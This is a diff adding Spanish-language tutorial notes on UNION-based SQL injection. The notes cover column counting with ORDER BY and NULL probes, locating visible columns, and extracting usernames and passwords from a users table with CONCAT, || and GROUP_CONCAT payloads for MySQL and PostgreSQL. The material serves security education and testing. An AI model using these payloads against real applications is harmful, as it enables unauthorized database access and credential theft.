@@ -1,0 +1,55 @@
+SQL Injection — ataques UNION
+
+UNION permite concatenar el resultado de otra consulta SELECT a la respuesta original. Requisitos y pasos:
+
+Paso 1: Determinar el número de columnas
+
+Técnica: iterar ORDER BY n en la consulta original o usar UNION SELECT con n columnas de tipo NULL hasta no obtener error.
+
+Ejemplo (procedimiento):
+
+• Probar: /product?id=1 ORDER BY 1-- → OK
+• /product?id=1 ORDER BY 2-- → OK
+• /product?id=1 ORDER BY 3-- → ERROR → entonces hay 2 columnas
+
+O con UNION:
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+El payload que no produce error sugiere el número correcto.
+
+Paso 2: Encontrar columnas con tipos útiles
+
+Si la aplicación muestra una columna en la página, inyecta una cadena en cada posición: UNION SELECT 'a', NULL, NULL y ver cuál aparece.
+
+Consejo: usar funciones de conversión o casting si el motor lo requiere (CAST(... AS CHAR)).
+
+Paso 3: Recuperar datos
+
+Una vez identificadas columnas visibles, reemplazar 'a' por una subconsulta que lea de users:
+
+' UNION SELECT username, password FROM users--
+
+Si hay más columnas de las esperadas, rellena con NULL o con valores convertidos: UNION SELECT username, NULL, password--.
+
+Paso 4: Recuperar múltiples valores en una sola columna
+
+Si sólo puedes inyectar una columna visible, concatenar múltiples campos en una única cadena:
+
+MySQL:
+UNION SELECT CONCAT(username, ':', password) FROM users--
+
+PostgreSQL:
+UNION SELECT username || ':' || password FROM users--
+
+O usar agregaciones: GROUP_CONCAT, string_agg:
+UNION SELECT GROUP_CONCAT(username,':',password) FROM users--
+
+Notas sobre columnas y tipos
+
+• Si la aplicación espera un número, UNION con NULL o un 0 puede funcionar.
+• Para columnas TEXT/VARCHAR usar CONCAT o funciones de conversión.
+
+---
